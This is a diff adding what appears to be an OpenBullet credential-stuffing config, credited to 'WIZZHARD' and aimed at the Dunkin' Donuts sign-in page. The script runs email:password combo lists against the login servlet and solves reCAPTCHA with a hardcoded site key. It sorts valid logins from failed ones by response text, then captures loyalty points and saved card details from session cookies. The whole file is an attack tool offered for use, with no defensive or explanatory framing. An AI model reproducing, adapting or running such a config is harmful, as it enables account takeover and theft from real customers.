@@ -1,0 +1,91 @@
+[SETTINGS]
+{
+  "Name": "DUNKIN WIZZHARD",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-30T23:35:03.8566004+08:00",
+  "AdditionalInfo": "Recaptcha",
+  "Author": "WIZZHARD",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "https://www.dunkindonuts.com/en/sign-in" AutoRedirect=FALSE 
+  
+  HEADER "ccept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" 
+
+#LOGIN_TROUGHT_FAILURE KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "You don't have permission to access" 
+    KEY "Sorry, information you supplied does not match our records" 
+
+RECAPTCHA "https://www.dunkindonuts.com/en/sign-in" "6LdBZzcUAAAAAB-XtqPF8RiNX45TdtYYWtnHcSPF&id=fc6749243e8d55de" -> VAR "recaptcha" 
+
+#POST_DATA_LOGIN REQUEST POST "https://www.dunkindonuts.com/bin/servlet/signin" AutoRedirect=FALSE 
+  CONTENT "service=signin&email=<USER>&password=<PASS>&g-recaptcha-response=<recaptcha>&currentPageURL=%2Fcontent%2Fdd%2Fen%2Fsign-in" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "referer: https://www.dunkindonuts.com/en/sign-in" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "csrf-token: undefined" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Profile ID does not exist." 
+    KEY "Profile information is invalid" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES(*)>" Contains "{\"firstName" 
+
+#COOKIE PARSE "<COOKIES(user_info)>" LR "" "" -> VAR "COOKIE" 
+
+#LOYALTY_POINTS PARSE "<COOKIE>" LR "" "" -> CAP "LOYALTY_POINTS" 
+
+#CARDS PARSE "<COOKIE>" LR "" "" -> CAP "cards" 
+
